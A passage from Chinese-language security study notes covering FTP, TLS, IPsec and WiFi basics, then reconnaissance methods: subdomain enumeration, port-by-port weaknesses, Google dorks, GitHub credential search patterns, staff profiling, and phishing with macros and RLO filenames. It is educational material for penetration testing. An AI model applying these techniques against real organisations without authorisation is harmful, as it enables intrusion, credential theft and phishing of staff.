   　　命令连接：客户端 >1023端口 -> 服务器 21端口
   　　数据连接：客户端 >1023端口 -> 服务器 >1023端口 

##### 工作原理

###### 登录

使用用户名&密码进行登录

匿名FTP：对于一些提供公众文件拷贝服务的FTP服务器，使用匿名方式，即不需要登录。

###### 传输

一个FTP服务器进程可同时为多个客户进程提供服务。FTP的服务器进程由两大部分组成：**一个主进程**，负责接受新的请求；另外有**若干个从属进程**，负责处理单个请求。

主进程的工作步骤如下：

1. 打开熟知端口（端口号为21），使客户进程能够连接上。

2. 等待客户进程发出连接请求。
3. 启动从属进程处理客户进程发来的请求。从属进程对客户进程的请求处理完毕后即终止，但从属进程在运行期间根据需要还可能创建其他一些子进程。
4. 回到等待状态，继续接受其他客户进程发来的请求。主进程与从属进程的处理是并发进行的。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604180526813.png" alt="image-20220604180526813" style="zoom: 50%;" />

在进行文件传输时，FTP的客户和服务器之间要建立**两个并行的TCP连接**：**控制连接和数据连接**。

控制连接在整个会话期间**一直保持打开**，FTP客户所发出的**传送请求**，通过控制连接发送给服务器端的控制进程，但控制连接并不用来传送文件。实际用于传输文件的是**数据连接**（一般使用端口20）。

服务器端的控制进程在接收到FTP客户发送来的文件传输请求后就创建**数据传送进程和数据连接**，用来连接客户端和服务器端的数据传送进程。

数据传送进程实际完成文件的传送，在传送完毕后关闭“数据传送连接”并结束运行。由于FTP使用了一个分离的控制连接，因此FTP的控制信息是带外（out of band)传送的。

**NFS**：FTP协议中，如果客户端A想要修改服务器端B中的某个文件，需要下载B中的文件，修改后再进行上传，传输过程浪费了很多时间。而NFS则采用另一种思路，**NFS允许应用进程打开一个远地文件，并能在该文件的某一个特定的位置上开始读写数据**。这样，NFS可使用户只复制一个大文件中的一个很小的片段，而不需要复制整个大文件。对于上述例子，计算机A中的NFS客户软件，把要添加的数据和在文件后面写数据的请求一起发送到远地的计算机B中的NFS服务器，NFS服务器更新文件后返回应答信息，在网络上传送的只是少量的修改数据。

###### 数据传输模式

**ASClI模式**

假定正在传输的文件为简单的ASClI码文本，此时ftp通常会自动地调整文件内容以便于把文件解释成另外一台计算机存储文本文件的格式（例如，互换WINDOWS和UNIX的行结束符）。

**二进制模式**

在二进制传输中，保存文件的位序，以便拷贝和原始文件是逐位一一对应的。

更多模式可参考[RFC959-DataTransfer](https://www.w3.org/Protocols/rfc959/3_DataTransfer.html)。

#### 2.6.9.3 参考

《TCP/IP详解I》第27章

《计算机网络第7版 谢希仁》6.2

[RFC 959](https://tools.ietf.org/html/rfc959)

[RFC1350](https://tools.ietf.org/html/rfc1350)

## 2.7 SSL/TLS

### 2.7.1 简介

**SSL**全称是Secure Sockets Layer，安全套接字层，它是由网景公司 (Netscape) 在 1994 年时设计，主要用于 Web 的安全传输协议，用来保障在网络上数据传输的安全，利用数据加密技术，可确保数据在网络上的传输过程中不会被截取，当前版本为3.0。如今，SSL已经成为互联网保密通信的工业标准。

SSL最初的几个版本 (SSL 1.0、SSL2.0、SSL 3.0) 由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组 (IETF) 正式接管，并更名为 TLS(Transport Layer Security，安全传输层协议)，用于在两个通信应用程序之间提供保密性和数据完整性。

**TLS协议**由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。发展至今已有 TLS 1.0、 TLS1.1、TLS1.2、TLS1.3 这几个版本。

如 TLS 名字所说，SSL/TLS 协议仅保障传输层安全。同时，由于协议自身特性 (数字证书机制)，SSL/TLS不能被用于保护多跳 (multi-hop) 端到端通信，而只能保护点到点通信。

自从出了POODLE漏洞之后，SSL3.0已经直接定性成不安全的协议版本了。pdf下载链接如下，共4页，可以看一下，**漏洞编号为CVE­-2014-3566**。

[《This POODLE Bites: Exploiting The SSL 3.0 Fallback》](https://www.openssl.org/~bodo/ssl-poodle.pdf)

SSL/TLS 协议能够提供的安全目标主要包括如下几个：

- ###### 认证性

  -   借助数字证书认证服务端端和客户端身份，防止身份伪造

- ###### 机密性

  -   借助加密防止第三方窃听

- ###### 完整性

  -   借助消息认证码 (MAC) 保障数据完整性，防止消息篡改

- ###### 重放保护

  -   通过使用隐式序列号防止重放攻击

为了实现这些安全目标，SSL/TLS 协议被设计为一个两阶段协议，分为握手阶段和应用阶段：

- 握手阶段也称协商阶段，在这一阶段，客户端和服务端端会认证对方身份 (依赖于 PKI 体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及 MasterSecret。后续通信使用的所有密钥都是通过 MasterSecret 生成。在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。

### 2.7.2 协议

TLS 包含几个子协议，比较常用的有记录协议、警报协议、握手协议、变更密码规范协议等。

#### 记录协议

记录协议 (Record Protocol) 规定了 TLS 收发数据的基本单位记录 (record)。

#### 警报协议

警报协议 (Alert Protocol) 用于提示协议交互过程出现错误。

#### 握手协议

握手协议 (Handshake Protocol) 是 TLS 里最复杂的子协议，在握手过程中协商 TLS 版本号、随机数、密码套件等信息，然后交换证书和密钥参数，最终双方协商得到会话密钥，用于后续的混合加密系统。

#### 变更密码规范协议

变更密码规范协议 (Change Cipher Spec Protocol) 是一个"通知"，告诉对方，后续的数据都将使用加密保护。

### 2.7.3 交互过程

**Client Hello**

Client Hello 由客户端发送，内容包括客户端的一个 Unix 时间戳 (GMT Unix Time)、一些随机的字节 (Random Bytes)，还包括了客户端接受的算法类型 (Cipher Suites)。

**Server Hello**

Server Hello 由服务端发送，内容包括服务端支持的算法类型、GMT Unix Time 以及 Random Bytes。

**Certificate**

由服务端或者客户端发送，发送方会会将自己的数字证书发送给接收方，由接收方进行证书验证，如果不通过的话，接收方会中断握手的过程。一般跟在 Client / Server Hello 报文之后。

**Server Key Exchange**

由服务端发送，将自己的公钥参数传输给了客户端，一般也和 Server Hello 与 Certificate 在一个 TCP 报文中。

**Server Hello Done**

服务端发送，一般也和 Server Hello、Certificate 和 Server Key Exchange 在一个 TCP 报文中。

**Client Key Exchange**

客户端发送，向服务端发送自己的公钥参数，与服务端协商密钥。

**Change Cipher Spec**

客户端或者服务端发送，紧跟着 Key Exchange 发送，代表自己生成了新的密钥，通知对方以后将更换密钥，使用新的密钥进行通信。

**Encrypted Handshake Message**

客户端或者服务端发送，紧跟着 Key Exchange 发送。进行测试，一方用自己的刚刚生成的密钥加密一段固定的消息发送给对方，如果密钥协商正确无误的话，对方可以正确解密。

**New Session Ticket**

服务端发送，表示发起会话，在一段时间之内 (超时时间到来之前)，双方都以刚刚交换的密钥进行通信。从这以后，加密通信正式开始。

**Application Data**

使用密钥交换协议协商出来的密钥加密的应用层的数据。

**Encrypted Alert**

客户端或服务端发送，意味着加密通信因为某些原因需要中断，警告对方不要再发送敏感的数据。

### 2.7.4 版本更新内容

#### TLS 1.3

- 引入了 PSK 作为新的密钥协商机制

- 支持 0-RTT 模式，以安全性降低为代价，在建立连接时节省了往返时间

- ServerHello 之后的所有握手消息采取了加密操作，可见明文减少

- 不再允许对加密报文进行压缩、不再允许双方发起重协商

- DSA 证书不再允许在 TLS 1.3 中使用

- ##### 删除不安全的密码算法

  -   RSA 密钥传输 - 不支持前向安全性

  -   CBC 模式密码 - 易受 BEAST 和 Lucky 13 攻击

  -   RC4 流密码 - 在 HTTPS 中使用并不安全

  -   SHA-1 哈希函数 - 建议以 SHA-2 取而代之

  -   任意 Diffie-Hellman 组- CVE-2016-0701 漏洞

  -   输出密码 - 易受 FREAK 和 LogJam 攻击

### 2.7.5 子协议

SSL/TLS 协议有一个高度模块化的架构，分为很多子协议，主要是：

- ###### Handshake 协议

  -   包括协商安全参数和密码套件、服务端身份认证 (客户端身份认证可选)、密钥交换

- ###### ChangeCipherSpec 协议

  -   一条消息表明握手协议已经完成

- ###### Alert 协议

  -   对握手协议中一些异常的错误提醒，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告

- ###### Record 协议

  -   包括对消息的分段、压缩、消息认证和完整性保护、加密等

### 2.7.6 参考链接

#### RFC

-   [RFC 2246 The TLS Protocol Version 1.0](https://tools.ietf.org/html/rfc2246)

-   [RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1](https://tools.ietf.org/html/rfc4346)

-   [RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2](https://tools.ietf.org/html/rfc5246)

-   [RFC 6101 The Secure Sockets Layer (SSL) Protocol Version 3.0](https://tools.ietf.org/html/rfc6101)

-   [RFC 6176 Prohibiting Secure Sockets Layer (SSL) Version 2.0](https://tools.ietf.org/html/rfc6176)

-   [RFC 7568 Deprecating Secure Sockets Layer Version 3.0](https://tools.ietf.org/html/rfc7568)

-   [RFC 8446 The Transport Layer Security (TLS) Protocol Version 1.3](https://tools.ietf.org/html/rfc8446)

#### Document

-   [Wikipedia Transport Layer Security



## 2.8 IPsec

### 2.8.1 简介

IPsec（IP Security）是 IETF 制定的三层隧道加密协议，它为 Internet 上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。特定的通信方之间在 IP 层通过加密与数据源认证等方式，提供了以下的安全服务：

-   ##### 数据机密性（Confidentiality）

    -   IPsec 发送方在通过网络传输包前对包进行加密。

-   ##### 数据完整性（Data Integrity）

    -   IPsec 接收方对发送方发送来的包进行认证，以确保数据在传输过程中没有被篡改。

-   ##### 数据来源认证（Data Authentication）

    -   IPsec 在接收端可以认证发送 IPsec 报文的发送端是否合法。

-   ##### 防重放（Anti-Replay）

    -   IPsec 接收方可检测并拒绝接收过时或重复的报文。

### 2.8.2 优点

IPsec 具有以下优点：

-   支持 IKE（Internet Key Exchange，因特网密钥交换），可实现密钥的自动协商功能，减少了密钥协商的开销。可以通过 IKE 建立和维护 SA 的服务，简化了 IPsec 的使用和管理。

-   所有使用 IP 协议进行数据传输的应用系统和服务都可以使用 IPsec，而不必对这些应用系统和服务本身做任何修改。

-   对数据的加密是以数据包为单位的，而不是以整个数据流为单位，这不仅灵活而 有助于进一步提高

IP 数据包的安全性，可以有效防范网络攻击。

### 2.8.3 构成

IPsec 由四部分内容构成：

-   负责密钥管理的 Internet 密钥交换协议 IKE（Internet Key Exchange Protocol）

-   负责将安全服务与使用该服务的通信流相联系的安全关联 SA（Security Associations）

-   直接操作数据包的认证头协议 AH（IP Authentication Header）和安全载荷协议 ESP（IP Encapsulating Security Payload）

-   若干用于加密和认证的算法

### 2.8.4 安全联盟（Security Association，SA）

> 1. IPsec 在两个端点之间提供安全通信，端点被称为 IPsec 对等体。
>
> 2. SA 是 IPsec 的基础，也是 IPsec 的本质。SA 是通信对等体间对某些要素的约定，例如，使用哪种协议（AH、 ESP 还是两者结合使用）、协议的封装模式（传输模式和隧道模式）、加密算法（DES、3DES 和 AES）、特定流中保护数据的共享密钥以及密钥的生存周期等。建立 SA 的方式有手工配置和 IKE 自动协商两种。
>
> 3. SA 是单向的，在两个对等体之间的双向通信，最少需要两个 SA 来分别对两个方向的数据流进行安全保护。同时，如果两个对等体希望同时使用 AH 和 ESP 来进行安全通信，则每个对等体都会针对每一种协议来构建一个独立的 SA。
>
> 4. SA 由一个三元组来唯一标识，这个三元组包括 SPI（Security Parameter Index，安全参数索引）、目的 IP
>
> 5. 地址、安全协议号（AH 或 ESP）。
>
> 6. SPI 是用于唯一标识 SA 的一个 32 比特数值，它在 AH 和 ESP 头中传输。在手工配置 SA 时，需要手工指定 SPI 的取值。使用 IKE 协商产生 SA 时，SPI 将随机生成。

### 2.8.5 IKE

> 1. IKE（RFC2407，RFC2408、RFC2409）属于一种混合型协议，由 Internet 安全关联和密钥管理协议（ISAKMP）和两种密钥交换协议 OAKLEY 与 SKEME 组成。IKE 创建在由 ISAKMP 定义的框架上，沿用了 OAKLEY的密钥交换模式以及 SKEME 的共享和密钥更新技术，还定义了它自己的两种密钥交换方式。
>
> 2. IKE 使用了两个阶段的 ISAKMP：
>
> 3. 第一阶段，协商创建一个通信信道（IKE SA），并对该信道进行验证，为双方进一步的 IKE 通信提供机密性、消息完整性以及消息源验证服务；第二阶段，使用已建立的 IKE SA 建立 IPsec SA（V2 中叫 Child SA）。



## 2.9 WiFi

### 2.9.1 简介

Wi-Fi又称"无线热点"或"无线网络"，是WiFi联盟的商标，一个基于IEEE 802.11标准的无线局域网技术。

### 2.9.2 攻击

#### 暴力破解

WiFi密码是基于预置的秘钥，可以通过抓取报文的方式在本地快速的批量进行密码爆破尝试。

#### 伪造热点

AP可以动态的广播自己，客户也可以主动发送探针请求。可以伪造AP发送对探针请求的响应包，来让客户端错误的识别。

#### 秘钥重装攻击

该漏洞由Vanhoef发现。Wi-Fi在握手时双方会更新秘钥，该攻击通过重放握手信息，令客户端重新安装相同的秘钥。

#### Dragonblood

最新版的WPA3标准在实现上存在一些问题，同样由Vanhoef发现。包含拒绝服务攻击、降级攻击、侧信道泄露等。

### 2.9.3 参考链接

-   [Wi-Fi Alliance](https://www.wi-fi.org/)
-   [Dragonblood](https://papers.mathyvanhoef.com/dragonblood.pdf) : Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd
-   [Improving Privacy through Fast Passive Wi-Fi Scanning](https://papers.mathyvanhoef.com/nordsec2019.pdf)
-   [Practical Side-Channel Attacks against WPA-TKIP](https://papers.mathyvanhoef.com/asiaccs2019.pdf)
-   [Key Reinstallation Attacks: Breaking the WPA2 Protocol](https://papers.mathyvanhoef.com/blackhat-eu2017.pdf)
-   [RFC 7664 Dragonfly Key Exchange](https://tools.ietf.org/html/rfc7664)



# 三. 信息收集

## 3.1 网络入口/信息

-   **网络拓扑信息**
    -   外网出口
    
-   **IP信息**
    -   C 段
    
-   **线下网络**
-   **Wi-Fi**
    -   SSID
    
    -   认证信息
    
-   **VPN**
    -   厂商
    
    -   登录方式
    
-   **邮件网关**

-   **手机APP**

-   **小程序后台**

-   **OA**

-   **SSO**
-   **边界网络设备**
-   **上游运营商**

## 3.2 域名信息

### 3.2.1 Whois

[Whois](https://www.whois.com/) 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。

### 3.2.2 搜索引擎搜索

搜索引擎通常会记录域名信息，可以通过 site: domain 的语法来查询。

### 3.2.3 第三方查询

网络中有相当多的第三方应用提供了子域的查询功能，下面有一些例子，更多的网站可以在 8.1 工具列表中查找。

-   [DNSDumpster](https://dnsdumpster.com/)

-   [Virustotal](https://www.virustotal.com/)

-   CrtSearch

-   threatminer

-   Censys

### 3.2.4 ASN信息关联

在网络中一个自治系统 (Autonomous System, AS) 是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理网络单元 (例如一所大学，一个企业或一个公司个体) 。

一个自治系统有时也被称为是一个路由选择域 (routing domain) 。一个自治系统将会分配一个全局的唯一的16位号码，这个号码被称为自治系统号 (ASN) 。因此可以通过ASN号来查找可能相关的IP，例如：

### 3.2.5 域名相关性

同一个企业/个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。一种**操作步骤**如下：

-   查询域名注册邮箱

-   通过域名查询备案号

-   通过备案号查询域名

-   反查注册邮箱

-   反查注册人

-   通过注册人查询到的域名在查询邮箱

-   通过上一步邮箱去查询域名

-   查询以上获取出的域名的子域名

### 3.2.6 网站信息利用

网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。

网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在 JavaScript 文件、资源文件链接等位置。

网站的安全策略如跨域策略、CSP规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个SSL/TLS证书，因此有时可通过证书来获取相关域名信息。

### 3.2.7 HTTPS证书

#### 证书透明度

为了保证HTTPS证书不会被误发或伪造，CA会将证书记录到可公开验证、不可篡改 只能附加内容的日志中，任何感兴趣的相关方都可以查看由授权中心签发的所有证书。因此可以通过查询已授权证书的方式来获得相关域名。

#### SAN

主题备用名称 (Subject Alternate Name, SAN)，简单来说，在需要多个域名，并将其用于各项服务时，多使用SAN证书。SAN允许在安全证书中使用subjectAltName字段将多种值与证书关联，这些值被称为主题备用名称。

### 3.2.8 域传送漏洞

DNS域传送 (zone transfer) 指的是冗余备份服务器使用来自主服务器的数据刷新自己的域 (zone) 数据库。这是为了防止主服务器因意外不可用时影响到整个域名的解析。

一般来说，域传送操作应该只允许可信的备用DNS服务器发起，但是如果错误配置了授权，那么任意用户都可以获得整个DNS服务器的域名信息。这种错误授权被称作是DNS域传送漏洞。

### 3.2.9 Passive DNS

Passive DNS被动的从递归域名服务器记录来自不同域名服务器的响应，形成数据库。利用Passive DNS数据库可以知道域名曾绑定过哪些IP，IP曾关联到哪些域名，域名最早/最近出现的时间，为测试提供较大的帮助。Virustotal、passivetotal、CIRCL等网站都提供了Passive DNS数据库的查询。

### 3.2.10 泛解析

泛解析是把*\*.example.com*的所有A记录都解析到某个IP地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。

### 3.2.11 重要记录

#### CNAME

CNAME即Canonical name，又称alias，将域名指向另一个域名。其中可能包含其他关联业务的信息。很多网站使用的CDN 加速功能利用了该记录。

#### MX记录

MX记录即Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来寻找SMTP服务器信息。

#### NS记录

NS (Name Server) 记录是域名服务器的记录，用来指定域名由哪个 DNS 服务器来进行解析。

#### SPF记录

SPF (Sender Policy Framework) 是为了防止垃圾邮件而提出来的一种 DNS 记录类型，是一种 TXT 类型的记录，用于登记某个域名拥有的用来外发邮件的所有 IP 地址。通过 SPF 记录可以获取相关的 IP 信息，常用命令为 dig example.com txt 。

### 3.2.12 CDN

#### CDN验证

可通过多地 ping 的方式确定目标是否使用了 CDN，常用的网站有 <http://ping.chinaz.com/> https:// asm.ca.com/en/ping.php 等。

#### 域名查找

使用了 CDN 的域名的父域或者子域名不一定使用了 CDN，可以通过这种方式去查找对应的 IP。

#### 历史记录查找

CDN 可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实 IP。

#### 邮件信息

通过社会工程学的方式进行邮件沟通，从邮件头中获取 IP 地址，IP 地址可能是网站的真实 IP 或者是目标的出口 IP。

### 3.2.13 子域爆破

在内网等不易用到以上技巧的环境，或者想监测新域名上线时，可以通过批量尝试的方式，找到有效的域名。

### 3.2.14 缓存探测技术

在企业网络中通常都会配置 DNS 服务器为网络内的主机提供域名解析服务。域名缓存侦测（DNS Cache Snooping）技术就是向这些服务器发送域名解析请求，但并不要求使用递归模式，用于探测是否请求过某个域名。这种方式可以用来探测是否使用了某些软件，尤其是安全软件。



## 3.3 端口信息

### 3.3.1  常见端口及其脆弱点

-   ##### FTP (21/TCP)

    -   默认用户名密码 anonymous:anonymous

    -   暴力破解密码

    -   VSFTP 某版本后门

-   ##### SSH (22/TCP)

    -   部分版本 SSH 存在漏洞可枚举用户名

    -   暴力破解密码

-   ##### Telent (23/TCP)

    -   暴力破解密码

    -   嗅探抓取明文密码

-   ##### SMTP (25/TCP)

    -   无认证时可伪造发件人

-   ##### DNS (53/UDP)

    -   域传送漏洞

    -   DNS 劫持

    -   DNS 缓存投毒

    -   DNS 欺骗

    -   SPF / DMARC Check

    -   ##### DDoS

        -   DNS Query Flood

        -   DNS 反弹

    -   DNS 隧道

-   ##### DHCP 67/68

    -   劫持/欺骗

-   ##### TFTP (69/TCP)

-   ##### HTTP (80/TCP)

-   ##### Kerberos (88/TCP)

    -   主要用于监听 KDC 的票据请求

    -   用于进行黄金票据和白银票据的伪造

-   ##### POP3 (110/TCP)

    -   爆破

-   ##### RPC (135/TCP)

    -   wmic 服务利用

-   ##### NetBIOS (137/UDP & 138/UDP)

    -   未授权访问

    -   弱口令

-   ##### NetBIOS / Samba (139/TCP)

    -   未授权访问

    -   弱口令

-   ##### SNMP (161/TCP)

    -   Public 弱口令

-   ##### LDAP (389/TCP)

    -   用于域上的权限验证服务

    -   匿名访问

    -   注入

-   ##### HTTPS (443/TCP)

-   ##### SMB (445/TCP)

    -   Windows 协议簇，主要功能为文件共享服务

    -   net use \\\\192.168.1.1 /user:xxx\\username password

-   ##### Linux Rexec (512/TCP & 513/TCP & 514/TCP)

    -   弱口令

-   ##### Rsync (873/TCP)

    -   未授权访问

-   ##### RPC (1025/TCP)

    -   NFS 匿名访问

-   ##### Java RMI (1090/TCP & 1099/TCP)

    -   反序列化远程命令执行漏洞

-   ##### MSSQL (1433/TCP)

    -   弱密码

    -   差异备份 GetShell

    -   SA 提权

-   ##### Oracle (1521/TCP)

    -   弱密码

-   ##### NFS (2049/TCP)

    -   权限设置不当

    -   showmount \<host\>

-   ##### ZooKeeper (2171/TCP & 2375/TCP)

    -   无身份认证

-   ##### Docker Remote API (2375/TCP)

    -   未限制 IP / 未启用 TLS 身份认证

    -   http://docker.addr:2375/version

-   ##### MySQL (3306/TCP)

    -   弱密码

    -   日志写 WebShell

    -   UDF 提权

    -   MOF 提权

-   ##### RDP / Terminal Services (3389/TCP)

    -   弱密码

-   ##### Postgres (5432/TCP)

    -   弱密码

    -   执行系统命令

-   ##### VNC (5900/TCP)

    -   弱密码

-   ##### CouchDB (5984/TCP)

    -   未授权访问

-   ##### WinRM (5985/TCP)

    -   Windows 对 WS-Management 的实现

    -   在 Vista 上需要手动启动，在 Windows Server 2008 中服务是默认开启的

-   ##### Redis (6379/TCP)

    -   无密码或弱密码

    -   绝对路径写 WebShell

    -   计划任务反弹 Shell

    -   写 SSH 公钥

    -   主从复制 RCE

    -   Windows 写启动项

-   ##### Kubernetes API Server (6443/TCP && 10250/TCP)

    -   https://Kubernetes:10250/pods

-   ##### JDWP (8000/TCP)

    -   远程命令执行

-   ##### ActiveMQ (8061/TCP)

-   ##### Jenkin (8080/TCP)

    -   未授权访问

-   ##### Elasticsearch (9200/TCP)

    -   代码执行

    -   http://es.addr:9200/\_plugin/head/

    -   http://es.addr:9200/\_nodes

-   ##### Memcached (11211/TCP)

    -   未授权访问

-   ##### RabbitMQ (15672/TCP & 15692/TCP & 25672/TCP)

-   ##### MongoDB (27017/TCP)

    -   无密码或弱密码

-   ##### Hadoop (50070/TCP & 50075/TCP)

    -   未授权访问

除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞

### 3.3.2  常见端口扫描技术

#### 全扫描

扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。

全扫描实现简单， 以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。

#### 半扫描

半扫描也称 SYN 扫描，在半扫描中，仅发送 SYN 数据段，如果应答为 RST，则端口处于关闭状态，若应答为 SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而 现在的大部分防火墙已经开始对这种扫描方式做处理。

#### FIN扫描

FIN 扫描是向目标发送一个 FIN 数据包，如果是开放的端口，会返回 RST 数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。

这种方式并不在 TCP 三次握手的状态中，所以不会被记录，相对 SYN 扫描要更隐蔽一些。

### 3.3.3  Web服务

-   ##### Jenkins

    -   未授权访问

-   ##### Gitlab

    -   对应版本 CVE

-   ##### Zabbix

    -   权限设置不当

### 3.3.4  批量搜索

-   Censys

-   Shodan

-   ZoomEye



## 3.4  站点信息

-   ##### 判断网站操作系统

    -   Linux 大小写敏感

    -   Windows 大小写不敏感

-   ##### 扫描敏感文件

    -   robots.txt

    -   crossdomain.xml

    -   sitemap.xml

    -   xx.tar.gz

    -   xx.bak

    -   等

-   ##### 确定网站采用的语言

    -   如 PHP / Java / Python 等

    -   找后缀，比如 php/asp/jsp

-   ##### 前端框架

    -   如 jQuery / BootStrap / Vue / React / Angular 等

    -   查看源代码

-   ##### 中间服务器

    -   如 Apache / Nginx / IIS 等

    -   查看 header 中的信息

    -   根据报错信息判断

    -   根据默认页面判断

-   ##### Web 容器服务器

    -   如 Tomcat / Jboss / Weblogic 等

-   ##### 后端框架

    -   根据 Cookie 判断

    -   根据 CSS / 图片等资源的 hash 值判断

    - ##### 根据 URL 路由判断
    
      -  如 wp-admin
    
    - 根据网页中的关键字判断
    - 根据响应头中的 X-Powered-By

-   ##### CDN信息

    -   常见的有 Cloudflare、yunjiasu

-   ##### 探测有没有WAF，如果有，什么类型的

    -   有 WAF，找绕过方式

    -   没有，进入下一步

-   ##### 扫描敏感目录，看是否存在信息泄漏

    -   扫描之前先自己尝试几个的 url，人为看看反应

-   ##### 使用爬虫爬取网站信息

-   ##### 拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名

-   ##### 常见入口目标

    -   关注度低的系统
    -   业务线较长的系统
    



## 3.5  搜索引擎利用

恰当地使用搜索引擎（Google/Bing/Yahoo/Baidu 等）可以获取目标站点的较多信息。

### 3.5.1  搜索引擎处理流程

-   ##### 数据预处理

    -   长度截断

    -   大小写转化

    -   去标点符号

    -   简繁转换

    -   数字归一化，中文数字、阿拉伯数字、罗马字

    -   同义词改写

    -   拼音改写

-   ##### 处理

    -   分词

    -   关键词抽取

    -   非法信息过滤

### 3.5.2  搜索技巧

-   #### [site:www.hao123.com](http://www.hao123.com/)

    -   返回此目标站点被搜索引擎抓取收录的所有内容

-   #### [site:www.hao123.com](http://www.hao123.com/) keyword

    -   返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面

    -   此处可以将关键词设定为网站后台，管理后台，密码修改，密码找回等

-   #### [site:www.hao123.com](http://www.hao123.com/) inurl:admin.php

    -   返回目标站点的地址中包含 admin.php 的所有页面，可以使用 admin.php/manage.php 或者其他关键词来寻找关键功能页面

-   #### [link:www.hao123.com](http://www.hao123.com/)

    -   返回所有包含目标站点链接的页面，其中包括其开发人员的个人博客，开发日志，或者开放这个站点的第三方公司，合作伙伴等

-   #### [related:www.hao123.com](http://www.hao123.com/)

    -   返回所有与目标站点"相似"的页面，可能会包含一些通用程序的信息等

-   #### intitle:"500 Internal Server Error" "server at"

    -   搜索出错的页面

-   #### inurl:"nph-proxy.cgi" "Start browsing"

    -   查找代理服务器

除了以上的关键字，还有allintile / allinurl / allintext / inanchor / intext / filetype / info / numberange / cache等。

#### 通配符

-   \* 代表某一个单词

-   OR 或者 \| 代表逻辑或

-   单词前跟 + 表强制查询

-   单词前跟 - 表排除对应关键字

-   \" 强调关键字

#### tips

-   查询不区分大小写

-   括号会被忽略

-   默认用 and 逻辑进行搜索

### 3.5.3  快照

搜索引擎的快照中也常包含一些关键信息，如程序报错信息可以会泄漏网站具体路径，或者一些快照中会保存一些测试用的测试信息，比如说某个网站在开发了后台功能模块的时候，还没给所有页面增加权限鉴别，此时被搜索引擎抓取了快照，即使后来网站增加了权限鉴别，但搜索引擎的快照中仍会保留这些信息。

另外也有专门的站点快照提供快照功能，如 Wayback Machine 和 [Archive.org](https://archive.org/) 等。

### 3.5.4  Github

在 Github 中，可能会存在源码泄露、AccessKey 泄露、密码、服务器配置泄露等情况，常见的搜索技巧有：

-   \@example.com password/pass/pwd/secret/credentials/token

-   \@example.com username/user/key/login/ftp/

-   \@example.com config/ftp/smtp/pop

-   \@example.com security_credentials/connetionstring

-   \@example.com JDBC/ssh2_auth_password/send_keys



## 3.6  社会工程学

### 3.6.3  企业信息收集

一些网站如天眼查等，可以提供企业关系挖掘、工商信息、商标专利、企业年报等信息查询，可以提供企业的较为细致的信息。

公司主站中会有业务方向、合作单位等信息。

### 3.6.2  人员信息收集

针对人员的信息收集考虑对目标重要人员、组织架构、社会关系的收集和分析。其中重要人员主要指高管、系统管理员、开发、运维、财务、人事、业务人员的个人电脑。

人员信息收集较容易的入口点是网站，网站中可能包含网站的开发、管理维护等人员的信息。从网站联系功能中和代码的注释信息中都可能得到的所有开发及维护人员的姓名和邮件地址及其他联系方式。

在获取这些信息后，可以在Github/Linkedin等社交、招聘网站中进一步查找这些人在互联网上发布的与目标站点有关的一切信息，分析并发现有用的信息。

此外，可以对获取到的邮箱进行密码爆破的操作，获取对应的密码。

### 3.6.3  钓鱼

基于之前收集到的信息，可以使用 Office/CHM/RAR/EXE/快捷方式等文件格式制作钓鱼邮件发送至目标，进一步收集信息。其中 Office 可以使用 Office 漏洞、宏、OLE 对象、PPSX 等方式构造利用文件。

Exe 可以使用特殊的 Unicode 控制字符如 RLO (Right-to-Left Override) 等来构建容易混淆的文件名。

RAR 主要是利用自解压等方式来构建恶意文件，同样加密的压缩包也在一定程度上可以逃逸邮件网关的检测。

如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。

需要注意的是，钓鱼测试也需要注意合规问题，不能冒充监管单位、不能发送违法违规信息。具体可以参考《中华人民共和国电信条例》、《中华人民共和国互联网电子邮件服务管理办法》等法律法规。

### 3.6.4  其他信息

公司的公众号、企业号、网站，员工的网盘、百度文库等可能会存在一些敏感信息，如 VPN/堡垒机账号、 TeamViewer 账号、网络设备默认口令、服务器默认口令等。

### 3.6.5  参考链接

-   [端口渗透总结](http://www.91ri.org/15441.html)

-   [未授权访问总结](https://paper.seebug.org/409)

-   [红队测试之邮箱打点](https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw_LqsQ)

-   [邮件伪造之SPF绕过的5种思路](https://mp.weixin.qq.com/s/dqntjRLgcOD3D2bi1oDFAw)





# 四. 常见漏洞攻防

## 4.1  SQL注入（SQL Injection）

### 4.1.1  注入分类

#### 简介

